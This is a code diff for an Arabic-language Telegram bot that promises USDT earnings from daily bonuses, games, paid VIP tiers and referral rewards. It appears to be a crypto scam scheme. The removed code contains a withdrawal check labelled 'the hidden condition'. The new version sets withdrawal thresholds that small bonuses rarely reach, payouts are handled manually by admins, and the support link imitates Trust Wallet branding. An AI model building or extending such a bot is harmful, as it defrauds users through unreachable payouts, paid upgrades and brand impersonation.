@@ -16,8 +16,11 @@ def load_users():
     """تحميل البيانات من الملف"""
     try:
         with open(DATA_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
+            data = json.load(f)
+            print(f"📂 تم تحميل {len(data)} مستخدم من الذاكرة")
+            return data
     except FileNotFoundError:
+        print("📂 لا يوجد بيانات سابقة، سيتم إنشاء ملف جديد")
         return {}
     except Exception as e:
         print(f"❌ خطأ في تحميل البيانات: {e}")
@@ -28,6 +31,7 @@ def save_users(users_data):
     try:
         with open(DATA_FILE, 'w', encoding='utf-8') as f:
             json.dump(users_data, f, ensure_ascii=False, indent=2)
+        print(f"💾 تم حفظ {len(users_data)} مستخدم في الذاكرة")
         return True
     except Exception as e:
         print(f"❌ خطأ في حفظ البيانات: {e}")
@@ -53,6 +57,7 @@ def get_user(user_id):
             daily_bonus = 0.75
             user_data['balance'] += daily_bonus
             user_data['total_earned'] += daily_bonus
+            print(f"🎁 منح مكافأة يومية {daily_bonus} لـ {user_id}")
             
             # منح مكافآت VIP
             vip_bonus = {
@@ -64,6 +69,7 @@ def get_user(user_id):
                 bonus = vip_bonus[user_data['vip_level']]
                 user_data['balance'] += bonus
                 user_data['total_earned'] += bonus
+                print(f"💎 منح مكافأة VIP {bonus} لـ {user_id}")
             
             save_users(users_data)
         
@@ -74,33 +80,46 @@ def get_user(user_id):
         'user_id': user_id_str,
         'username': "",
         'first_name': "",
-        'balance': 0.0,
+        'balance': 0.75,  # مكافأة ترحيبية
         'referrals_count': 0,
         'referrals_new': 0,
         'games_played_today': 0,
         'total_games_played': 0,
-        'total_earned': 0.0,
+        'total_earned': 0.75,
         'total_deposits': 0.0,
         'vip_level': 0,
         'registration_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'last_activity': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'last_reset_date': datetime.now().strftime('%Y-%m-%d'),
-        'withdrawal_address': ""
+        'withdrawal_address': "",
+        'registration_days': 0,
+        'last_daily_check': datetime.now().strftime('%Y-%m-%d')
     }
     
     users_data[user_id_str] = user_data
     save_users(users_data)
+    print(f"🆕 تم إنشاء مستخدم جديد: {user_id_str}")
     return user_data
 
 def save_user(user_data):
     """حفظ بيانات مستخدم"""
     users_data = load_users()
-    users_data[user_data['user_id']] = user_data
+    user_id = user_data['user_id']
+    users_data[user_id] = user_data
+    
+    print(f"💾 حفظ بيانات user_id: {user_id}, الرصيد: {user_data['balance']}")
     return save_users(users_data)
 
 def update_user_activity(user_id):
     user = get_user(user_id)
     user['last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    # تحديث أيام التسجيل
+    registration_date = datetime.strptime(user['registration_date'].split()[0], '%Y-%m-%d')
+    current_date = datetime.now()
+    days_registered = (current_date - registration_date).days
+    user['registration_days'] = days_registered
+    
     save_user(user)
 
 def get_vip_level_name(level):
@@ -123,17 +142,15 @@ def get_remaining_attempts(user):
     return max(0, remaining), total_attempts, extra_attempts
 
 def get_mining_reward_time():
-    """وقت مكافأة التعدين (عشوائي)"""
-    hours = random.randint(12, 20)
-    minutes = random.randint(0, 59)
-    return f"{hours}س {minutes}د ⏳"
+    """وقت مكافأة التعدين (مبسط)"""
+    return "12س 00د ⏳"
 
 def can_withdraw(user):
     """التحقق من إمكانية السحب"""
-    has_15_referrals = user['referrals_count'] >= 15
-    has_10_deposit = user['total_deposits'] >= 10
-    has_15_new_referrals = user.get('referrals_new', 0) >= 15  # الشرط المخفي
-    return has_15_referrals and has_10_deposit and has_15_new_referrals
+    has_10_days = user.get('registration_days', 0) >= 10
+    has_150_balance = user['balance'] >= 150
+    has_address = bool(user.get('withdrawal_address', ''))
+    return has_10_days and has_150_balance and has_address
 
 # 🎯 الواجهة الرئيسية الجديدة
 @bot.message_handler(commands=['start', 'profile'])
@@ -158,6 +175,7 @@ def start_command(message):
 📈 الإحالات الجديدة: {user.get('referrals_new', 0)}/{user['referrals_count']}
 🏆 مستوى VIP: {vip_name}
 🎯 المحاولات المتبقية: {remaining_attempts} ({total_attempts} أساسية + {extra_attempts} إضافية)
+📅 أيام التسجيل: {user.get('registration_days', 0)} يوم
 
 ⏰ مكافأة التعدين: {mining_time}
 
@@ -165,7 +183,7 @@ def start_command(message):
 💳 إجمالي الإيداعات: {user['total_deposits']:.1f} USDT
 📅 تاريخ التسجيل: {user['registration_date'].split()[0]}"""
 
-    # الأزرار
+    # الأزرار (بدون زر التحديث)
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
         InlineKeyboardButton("🎮 الألعاب", callback_data="games"),
@@ -174,20 +192,10 @@ def start_command(message):
         InlineKeyboardButton("💰 السحب", callback_data="withdraw")
     )
     keyboard.add(
-        InlineKeyboardButton("🆘 الدعم الفني", url="https://t.me/Trust_wallet_Support_4"),
-        InlineKeyboardButton("🔄 تحديث", callback_data="refresh_profile")
+        InlineKeyboardButton("🆘 الدعم الفني", url="https://t.me/Trust_wallet_Support_4")
     )
     
-    # إرسال أو تعديل الرسالة
-    try:
-        bot.edit_message_text(
-            profile_text, 
-            message.chat.id, 
-            message.message_id, 
-            reply_markup=keyboard
-        )
-    except:
-        bot.send_message(message.chat.id, profile_text, reply_markup=keyboard)
+    bot.send_message(message.chat.id, profile_text, reply_markup=keyboard)
 
 # 🎮 قائمة الألعاب (نفس الكود السابق)
 @bot.callback_query_handler(func=lambda call: call.data == "games")
@@ -344,7 +352,7 @@ def show_vip_services(call):
     
     bot.edit_message_text(vip_text, call.message.chat.id, call.message.message_id, reply_markup=keyboard)
 
-# إرسال طلبات الشراء للادمن (لحسابك الأساسي)
+# إرسال طلبات الشراء للادمن (محدث)
 @bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
 def handle_vip_purchase(call):
     user = get_user(call.from_user.id)
@@ -358,22 +366,22 @@ def handle_vip_purchase(call):
     
     vip_name = vip_names.get(vip_type, 'VIP')
     
-    # إرسال طلب الشراء للادمن (لحسابك الأساسي)
+    # إرسال طلب الشراء للادمن (محدث)
     request_text = f"""🛒 طلب شراء جديد:
 
 👤 المستخدم: {user['first_name']} 
 🆔 الآيدي: {call.from_user.id}
-📞 username: @{user['username']}
+📞 للتواصل: [اضغط هنا](tg://user?id={call.from_user.id})
 💎 النوع: {vip_name}
 💰 الرصيد الحالي: {user['balance']:.1f} USDT
 📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-⏰ الرجاء التواصل مع المستخدم لتأكيد الطلب"""
+⏰ الرجاء التواصل مع المستخدم مباشرة بالضغط على الرابط أعلاه"""
     
     # إرسال لكل الأدمنز
     for admin_id in ADMIN_IDS:
         try:
-            bot.send_message(admin_id, request_text)
+            bot.send_message(admin_id, request_text, parse_mode='Markdown')
         except Exception as e:
             print(f"❌ Failed to send to admin {admin_id}: {e}")
     
@@ -384,33 +392,56 @@ def handle_vip_purchase(call):
         show_alert=True
     )
 
-# 💰 نظام السحب
+# 💰 نظام السحب (محدث)
 @bot.callback_query_handler(func=lambda call: call.data == "withdraw")
 def handle_withdraw(call):
     user = get_user(call.from_user.id)
     
     if not can_withdraw(user):
-        # رسالة الخطأ مع الشرط المخفي
-        if user['referrals_count'] < 15:
-            error_msg = "❌ تحتاج إلى 15 إحالة على الأقل للسحب"
-        elif user['total_deposits'] < 10:
-            error_msg = "❌ تحتاج إلى إيداع 10 USDT على الأقل للسحب"
+        # رسالة الخطأ مع الشروط الجديدة
+        if user.get('registration_days', 0) < 10:
+            error_msg = f"❌ تحتاج إلى 10 أيام تسجيل على الأقل للسحب\n📅 أيامك الحالية: {user.get('registration_days', 0)} يوم"
+        elif user['balance'] < 150:
+            error_msg = f"❌ الحد الأدنى للسحب هو 150 USDT\n💰 رصيدك الحالي: {user['balance']:.1f} USDT"
+        elif not user.get('withdrawal_address'):
+            error_msg = "❌ يرجى إعداد عنوان المحفظة أولاً"
         else:
             error_msg = "❌ لا يمكن السحب حالياً، يرجى المحاولة لاحقاً"
         
         bot.answer_callback_query(call.id, error_msg, show_alert=True)
         return
     
+    show_withdrawal_options(call.message, user)
+
+def show_withdrawal_options(message, user):
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("💰 سحب 150 USDT", callback_data="withdraw_150"),
+        InlineKeyboardButton("💰 سحب 300 USDT", callback_data="withdraw_300"),
+        InlineKeyboardButton("💰 سحب 500 USDT", callback_data="withdraw_500"),
+        InlineKeyboardButton("💰 سحب كل الرصيد", callback_data="withdraw_all")
+    )
+    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
+    
+    # إذا ما عندو عنوان محفظة، اطلب منه
     if not user.get('withdrawal_address'):
-        # طلب عنوان المحفظة
         msg = bot.send_message(
-            call.message.chat.id,
+            message.chat.id,
             "💰 نظام السحب\n\n"
             "📝 الرجاء إرسال عنوان محفظتك USDT (TRC20):"
         )
         bot.register_next_step_handler(msg, process_withdrawal_address, user)
-    else:
-        show_withdrawal_options(call.message, user)
+        return
+    
+    bot.send_message(
+        message.chat.id,
+        f"💰 نظام السحب\n\n"
+        f"💳 عنوان المحفظة: {user['withdrawal_address']}\n"
+        f"💰 الرصيد المتاح: {user['balance']:.1f} USDT\n"
+        f"📅 أيام التسجيل: {user.get('registration_days', 0)}/10 يوم\n\n"
+        f"اختر مبلغ السحب:",
+        reply_markup=keyboard
+    )
 
 def process_withdrawal_address(message, user):
     address = message.text.strip()
@@ -426,47 +457,32 @@ def process_withdrawal_address(message, user):
     save_user(user)
     show_withdrawal_options(message, user)
 
-def show_withdrawal_options(message, user):
-    keyboard = InlineKeyboardMarkup(row_width=2)
-    keyboard.add(
-        InlineKeyboardButton("💰 سحب 10 USDT", callback_data="withdraw_10"),
-        InlineKeyboardButton("💰 سحب 25 USDT", callback_data="withdraw_25"),
-        InlineKeyboardButton("💰 سحب 50 USDT", callback_data="withdraw_50"),
-        InlineKeyboardButton("💰 سحب كل الرصيد", callback_data="withdraw_all")
-    )
-    keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
-    
-    bot.send_message(
-        message.chat.id,
-        f"💰 نظام السحب\n\n"
-        f"💳 عنوان المحفظة: {user['withdrawal_address']}\n"
-        f"💰 الرصيد المتاح: {user['balance']:.1f} USDT\n\n"
-        f"اختر مبلغ السحب:",
-        reply_markup=keyboard
-    )
-
 @bot.callback_query_handler(func=lambda call: call.data.startswith('withdraw_'))
 def process_withdrawal(call):
     user = get_user(call.from_user.id)
     withdraw_type = call.data.replace('withdraw_', '')
     
     # حساب المبلغ
-    if withdraw_type == '10':
-        amount = 10.0
-    elif withdraw_type == '25':
-        amount = 25.0
-    elif withdraw_type == '50':
-        amount = 50.0
+    if withdraw_type == '150':
+        amount = 150.0
+    elif withdraw_type == '300':
+        amount = 300.0
+    elif withdraw_type == '500':
+        amount = 500.0
     else:  # withdraw_all
         amount = user['balance']
     
-    # التحقق من الرصيد
+    # التحقق من الرصيد والشروط
     if user['balance'] < amount:
         bot.answer_callback_query(call.id, f"❌ رصيدك غير كافي! الرصيد: {user['balance']:.1f} USDT", show_alert=True)
         return
     
-    if amount < 5:
-        bot.answer_callback_query(call.id, "❌ الحد الأدنى للسحب هو 5 USDT", show_alert=True)
+    if amount < 150:
+        bot.answer_callback_query(call.id, "❌ الحد الأدنى للسحب هو 150 USDT", show_alert=True)
+        return
+    
+    if user.get('registration_days', 0) < 10:
+        bot.answer_callback_query(call.id, f"❌ تحتاج إلى 10 أيام تسجيل للسحب\n📅 أيامك: {user.get('registration_days', 0)}", show_alert=True)
         return
     
     # خصم المبلغ
@@ -478,10 +494,11 @@ def process_withdrawal(call):
 
 👤 المستخدم: {user['first_name']} 
 🆔 الآيدي: {call.from_user.id}
-📞 username: @{user['username']}
+📞 للتواصل: [اضغط هنا](tg://user?id={call.from_user.id})
 💳 عنوان المحفظة: {user['withdrawal_address']}
 💰 المبلغ: {amount:.1f} USDT
 📊 الرصيد المتبقي: {user['balance']:.1f} USDT
+📅 أيام التسجيل: {user.get('registration_days', 0)} يوم
 📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
 ✅ تم خصم المبلغ من رصيد المستخدم"""
@@ -489,7 +506,7 @@ def process_withdrawal(call):
     # إرسال لكل الأدمنز
     for admin_id in ADMIN_IDS:
         try:
-            bot.send_message(admin_id, withdraw_text)
+            bot.send_message(admin_id, withdraw_text, parse_mode='Markdown')
         except Exception as e:
             print(f"❌ Failed to send to admin {admin_id}: {e}")
     
@@ -500,7 +517,7 @@ def process_withdrawal(call):
         show_alert=True
     )
 
-# 🎯 رابط الاحالات الجديد
+# 🎯 رابط الاحالات (محدث بمكافأة 1 USDT)
 @bot.callback_query_handler(func=lambda call: call.data == "referral")
 def handle_referral(call):
     update_user_activity(call.from_user.id)
@@ -512,14 +529,15 @@ def handle_referral(call):
 `{referral_link}`
 
 👥 مزايا الإحالات:
-• +1 محاولة ألعاب يومية لكل إحالة
+• 🎁 1 USDT مكافأة فورية لكل إحالة
+• +1 محاولة ألعاب يومية لكل إحالة  
 • فرصة ربح مضاعفة
 • وصول أسرع لشروط السحب
 
 📤 شارك الرابط مع أصدقائك واكسب المزيد!"""
     
     keyboard = InlineKeyboardMarkup()
-    keyboard.add(InlineKeyboardButton("📤 مشاركة الرابط", url=f"https://t.me/share/url?url={referral_link}&text=انضم%20إلي%20في%20هذا%20البوت%20الرائع!"))
+    keyboard.add(InlineKeyboardButton("📤 مشاركة الرابط", url=f"https://t.me/share/url?url={referral_link}&text=انضم%20إلي%20في%20هذا%20البوت%20الرائع%20واربح%20USDT%20مجاناً!"))
     keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_profile"))
     
     bot.edit_message_text(
@@ -530,17 +548,48 @@ def handle_referral(call):
         parse_mode='Markdown'
     )
 
-# 🔄 تحديث الملف الشخصي
-@bot.callback_query_handler(func=lambda call: call.data == "refresh_profile")
-def refresh_profile(call):
-    # إنشاء رسالة جديدة بدل التعديل لتجنب مشكلة الآيدي
-    start_command(call.message)
-    bot.answer_callback_query(call.id, "✅ تم التحديث")
-
 # 🔙 رجوع للبروفايل
 @bot.callback_query_handler(func=lambda call: call.data == "back_to_profile")
 def back_to_profile(call):
     start_command(call.message)
+
+# معالجة الإحالات من رابط الدعوة
+@bot.message_handler(func=lambda message: message.text and message.text.startswith('/start ref'))
+def handle_referral_start(message):
+    # استخراج آيدي المُحيل من الرابط
+    referrer_id = message.text.split('ref')[-1]
+    
+    # المستخدم الجديد
+    new_user = get_user(message.from_user.id)
+    new_user['first_name'] = message.from_user.first_name or ""
+    new_user['username'] = message.from_user.username or ""
+    
+    # المُحيل
+    if referrer_id.isdigit():
+        referrer = get_user(int(referrer_id))
+        if referrer['user_id'] != new_user['user_id']:  # منع الاحالة الذاتية
+            # منح مكافأة الإحالة
+            referral_bonus = 1.0
+            referrer['balance'] += referral_bonus
+            referrer['total_earned'] += referral_bonus
+            referrer['referrals_count'] += 1
+            referrer['referrals_new'] += 1
+            
+            save_user(referrer)
+            
+            # إعلام المُحيل
+            try:
+                bot.send_message(
+                    int(referrer_id),
+                    f"🎉 تهانينا! لقد قام {new_user['first_name']} بالتسجيل من خلال رابطك!\n"
+                    f"🎁 تم إضافة 1 USDT إلى رصيدك!\n"
+                    f"💰 رصيدك الجديد: {referrer['balance']:.1f} USDT"
+                )
+            except:
+                pass
+    
+    # عرض الواجهة للمستخدم الجديد
+    start_command(message)
 
 # =============================================
 # ⚡ كل الأوامر الإدارية الأصلية (مختصرة)
@@ -600,10 +649,13 @@ def add_referral(message):
         user = get_user(user_id)
         user['referrals_count'] += 1
         user['referrals_new'] += 1
+        # منح مكافأة الإحالة
+        user['balance'] += 1.0
+        user['total_earned'] += 1.0
         
         save_user(user)
         
-        bot.reply_to(message, f"✅ تم إضافة إحالة للمستخدم {user_id}\n👥 الإحالات الجديدة: {user['referrals_new']}\n👥 الإجمالي: {user['referrals_count']}")
+        bot.reply_to(message, f"✅ تم إضافة إحالة للمستخدم {user_id}\n🎁 مكافأة: 1 USDT\n👥 الإحالات الجديدة: {user['referrals_new']}\n👥 الإجمالي: {user['referrals_count']}")
         
     except Exception as e:
         bot.reply_to(message, f"❌ خطأ: {e}")
@@ -676,6 +728,7 @@ def user_info(message):
 💳 الإيداعات: {user['total_deposits']:.1f} USDT
 🏆 الأرباح: {user['total_earned']:.1f} USDT
 📅 مسجل منذ: {user['registration_date']}
+📅 أيام التسجيل: {user.get('registration_days', 0)} يوم
 🕒 آخر نشاط: {last_active}"""
         
         bot.reply_to(message, info_text)
@@ -727,15 +780,43 @@ def stats(message):
     except Exception as e:
         bot.reply_to(message, f"❌ خطأ: {e}")
 
+# =============================================
+# ⚡ كود تشغيل ويب سيرفر عشان Render
+# =============================================
+from flask import Flask
+import threading
+
+def run_web_server():
+    """تشغيل سيرفر ويب بسيط عشان Render"""
+    web_app = Flask(__name__)
+    
+    @web_app.route('/')
+    def home():
+        return "🤖 Bot is running and ready!"
+    
+    @web_app.route('/health')
+    def health():
+        return "✅ Healthy"
+    
+    port = int(os.environ.get("PORT", 10000))
+    web_app.run(host='0.0.0.0', port=port, debug=False)
+
 print("🔄 Starting bot...")
 print("💾 Database: JSON File (Permanent Storage)")
 print("🎮 Games: Slot & Dice (3 attempts + referrals)")
 print("💎 VIP Services: Bronze, Silver, Gold")
-print("💰 Withdrawal System: 15 referrals + 10 USDT deposit")
+print("💰 Withdrawal: 150 USDT min + 10 days required")
+print("🎁 Referral Bonus: 1 USDT per referral")
+print("🌐 Web server: Active for Render")
 print("✅ Bot is running and ready!")
 print("🛠️ All admin commands loaded!")
 
 if __name__ == "__main__":
+    # تشغيل سيرفر الويب في thread منفصل
+    web_thread = threading.Thread(target=run_web_server)
+    web_thread.daemon = True
+    web_thread.start()
+    
     try:
         bot.infinity_polling()
     except Exception as e:
